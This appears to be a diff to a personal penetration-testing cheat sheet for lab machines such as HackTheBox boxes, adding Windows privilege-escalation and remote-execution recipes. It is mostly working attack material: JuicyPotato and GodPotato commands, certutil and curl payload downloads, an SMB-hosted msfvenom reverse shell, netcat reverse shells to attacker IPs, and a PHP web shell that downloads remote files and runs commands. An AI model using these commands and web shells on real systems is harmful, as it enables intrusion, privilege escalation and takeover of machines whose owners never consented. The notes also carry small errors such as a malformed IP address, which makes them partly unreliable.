@@ -329,10 +329,23 @@ in the meterpreter shell type
 -     impersonate_token "NT AUTHORITY\SYSTEM"
 use godpotato
 check Jeeves box FYR
+1- use juicy potato by transferring the file to the target machine (AV is off)
+download exe file -> https://github.com/ohpe/juicy-potato/releases/tag/v0.1
+-     juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID of your windows machine} #you can get it from https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+2- use juicy potato by setting up your SMB server (AV is on)
+put juicypotato.exe & reverse.exe from msfvenom in your SMB server
+-     impacket-smbserver raman `pwd` #set up SMB server
+-     cmd /c "\\10.10.16.3\raman\juicypotato.exe -l 1337 -p \\10.10.16.3\raman\reverse.exe -t * -c {CLSID of your windows machine}"
 
 Alternate Data Stream (hidden files)
 ls -la is equal to dir /R in windows
 -     more < raman.txt:hidden.txt
+
+if the AV is enabled you can execute commands from the SMB server
+setup a smbserver
+-     impacket-smbserver raman `pwd`
+generate msfvenom payload and execute the command
+-     http://login.php?cmd= /c "10.10.16.6\raman\reverse.exe" #don't forget the URL encoding
 
 Copy a file from Windows to Linux by setting up SMB server
 setup a smbserver
@@ -726,7 +739,8 @@ Printspoofer
 curl 192.168.10.10/PrintSpoofer64.exe -o Pr.exe
 .\Pr.exe -i -c cmd  OR .\PrintSpoofer32.exe -i -c powershell.exe
 GODpotato
-curl 192.168.10.10:8081/GodPotato-NET2.exe -o god.exe
+curl 192.168.10.10:8081/GodPotato-NET2.exe -o god.exe     OR
+certutil.exe -urlcache -f http://10.10.16.8/GodPotato-NET2.exe GodPotato-NET2.exe
 .\god.exe -cmd "cmd /c whoami"    OR
 curl 192.168.10.10:8081/nc.exe -o nc.exe
 .\god.exe -cmd "cmd /c C:\xampp\htdocs\cms\files\nc.exe 192.168.10.10 443 -e cmd"
@@ -929,3 +943,21 @@ file upload
 if you can upload a file in ftp or smb server then upload nc.exe and shell.php "<?php system($GET['cmd']); ?>" then you can obtain a reverse shell
 -     http://10.10.10.97/shell.php?cmd=nc.exe 10.10.10.16.3 9001 cmd/powershell/bash....
 make a powershell shell ready from nishang and run a webserver then hit your webserver 
+
+file upload using fupload and execution using fexec. you can use it if cmd is not working perfectly
+tutorial --> https://vk9-sec.com/drupal-7-x-module-services-remote-code-execution/
+<?php
+
+    if (isset($_REQUEST['fupload'])) {
+
+        file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.12:8888/" . $_REQUEST['fupload']));
+
+    };
+
+    if (isset($_REQUEST['fexec'])) {
+
+        echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
+
+    };
+
+?>
